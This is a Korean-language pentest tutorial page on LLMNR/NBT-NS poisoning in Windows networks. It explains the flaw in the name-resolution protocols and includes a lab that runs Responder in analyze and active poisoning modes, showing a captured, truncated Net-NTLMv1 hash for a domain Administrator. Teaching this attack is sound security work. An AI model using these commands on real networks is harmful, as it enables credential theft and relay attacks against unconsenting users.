# LLMNR/NBT-NS 포이즈닝

LLMNR/Nbt-NS Poisoning (포이즈닝) - 피해자 호스트의 이름 변화 LLMNR/Nbt-NS 브로드캐스트 요청을 받았을 때 공격자가 LLMNR/Nbt-NS 브로드캐스트 요청에 대답하는 공격이다. 피해자 호스트는 공격자 호스트를 자신이 찾던 호스트로 착각하게 되어 Net-NTLM 인증 트래픽을 공격자에게 보낸다. &#x20;

### 개념

윈도우 워크스테이션과 서버 운영체제에는 LLMNR (Link-Local Multicast Name Resolution)과 Nbt-NS (Netbios Name Service) 라는 레거시 브로드캐스트 (broadcast) 이름 변환 (Name Resolution) 서비스들이 존재한다. 윈도우에서 HTTP나 내부망 쉐어, IP 주소등을 검색하거나 접근하려고 한다면 다음과 같은 우선순위를 기반으로 이름 변환을 시도한다.&#x20;

1. IPv6 - DNS &#x20;
2. IPv4 - DNS&#x20;
3. LLMNR, Nbt-NS, mDNS 등의 레거시 브로드캐스트 이름 변환 서비스 &#x20;

예를 들어 윈도우에서 쉐어를 찾으려고 탐색기에서 `\\fileserver.choi.local\share` 를 검색하려다가 실수로 `\\wronghost.choi.local\share` 를 검색했다고 가정해보자. 그렇다면 현재 호스트는 IPv6 -> IPv4 -> LLMNR, Nbt-NS, mDNS 등의 순서대로 이 호스트를 찾으려고 한다.&#x20;

![IPv4 -> Nbt-NS, mDNS, LLMNR](<../.gitbook/assets/image (2) (1) (2).png>)

### 문제점&#x20;

문제는 LLMNR, Nbt-NS, mDNS 가 옛날에 만들어진, 보안을 생각하지 않고 만든 브로드캐스트 기반의 이름 변환 프로토콜이라는 것이다. 브로드캐스트이기 때문에 같은 서브넷내의 모든 호스트들이 "wronghost.choi.local 이신 호스트 대답 좀 해주세요" 라는 요청을 듣게 된다.&#x20;

레거시 브로드캐스트 프로토콜들은 호스트/사용자 인증을 거치지 않기 때문에 공격자 호스트가 "wronghost.choi.local 찾으세요? 그거 저니까 저한테 사용자 인증 트래픽 보내주세요" 라고 대답할 때 피해자 호스트는 아무런 의심을 하지 않고 Net-NTLM 인증 트래픽을 공격자에게 보내게 된다.&#x20;

### 공격

LLMNR/Nbt-NS 포이즈닝 공격을 통해 피해자 호스트로부터 받은 Net-NTLM 사용자 인증 트래픽은 다음과 같은 공격에 사용된다.&#x20;

* NTLM 다운그레이드 공격 - Net-NTLMv1을 요청하거나 받은 Net-NTLMv1을 암호학적 공격으로 NTLM 해시로 다운그레이드 한 뒤 크래킹하는 공격&#x20;
* NTLM 릴레이 공격 - 받은 Net-NTLM 인증 트래픽을 다른 호스트에게 릴레이 하는 공격&#x20;
* RBCD (Resource Based Constrained Delegation) - TODO&#x20;

LLMNR/Nbt-NS 포이즈닝과 NTLM 릴레이 공격을 하면 피해자 호스트에서 피해자 유저의 사용자 NTLM 인증 트래픽을 SMB 프로토콜 기반의 Net-NTLMv1 혹은 Net-NTLMv2 형식으로 받을 수 있다. 이 사용자 인증 트래픽은 위 공격들에 사용되며, 해당 공격들은 다른 페이지에 따로 서술한다.&#x20;

### 전제 조건

* 현재 서브넷과 DNS로 이름 변환이 불가능한 호스트의 서비스 (대부분 SMB) 를 이용하려 피해자 호스트에서 피해자 유저가 검색한다.&#x20;
  * 실수로 오타 (ex. flieserver), 옛날에 만들어뒀던 scheduled task, 호스트 이름이 바뀌었을 때, 등
* 피해자 호스트가 LLMNR/Nbt-NS 를 사용하도록 설정되어 있다 (윈도우 비스타 이후 기본적으로 활성화되어 있다).&#x20;

### 실습&#x20;

Responder 툴을 이용해 서브넷에서 LLMNR, Nbt-NS, mDNS 트래픽을 수동적으로 듣고만 있는다&#x20;

```
# "Analyze" 모드를 이용, 포이즈닝을 하지않고 트래픽만 확인 
python3 Responder.py -I eth1 -v -A 

<...>
[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[Analyze mode: NBT-NS] Request by ::ffff:192.168.40.150 for wronghost, ignoring 
[Analyze mode: LLMNR] Request by ::ffff:192.168.40.150 for wronghost, ignoring
```

트래픽을 듣고 있으니`192.168.40.150` 호스트가 Nbt-NS와 mDNS를 이용해 `wronghosts.local` 이라는 호스트를 찾고 있다.&#x20;

이제 능동적으로 포이즈닝 공격을 진행해 피해자 호스트로부터 NTLM 사용자 인증 트래픽을 받아온다.

```
# ESS (SSP) 해제 시도와 함께 포이즈닝 공격 시작 
python3 Responder.py -I eth1 -v --disable-ess

<...>
[*] [MDNS] Poisoned answer sent to fe80::c092:c261:488a:c15c for name wronghost.local
[*] [LLMNR]  Poisoned answer sent to ::ffff:192.168.40.150 for name wronghost 
[SMB] NTLMv1-SSP Client   : fe80::c092:c261:488a:c15c                                                            
[SMB] NTLMv1-SSP Username : CHOI\Administrator                                                                   
[SMB] NTLMv1-SSP Hash     : Administrator::CHOI:06B1649C5 <...>
```

피해자 호스트 `192.168.40.150` 가 `wronghost.local` 이 공격자 호스트인줄 알고 NTLM 사용자 인증을 보내왔다. 이제 이 Net-NTLMv1 해시를 가지고 NTLM 릴레이, 다운그레이드, RBCD 공격을 할 수 있게 됐다.&#x20;
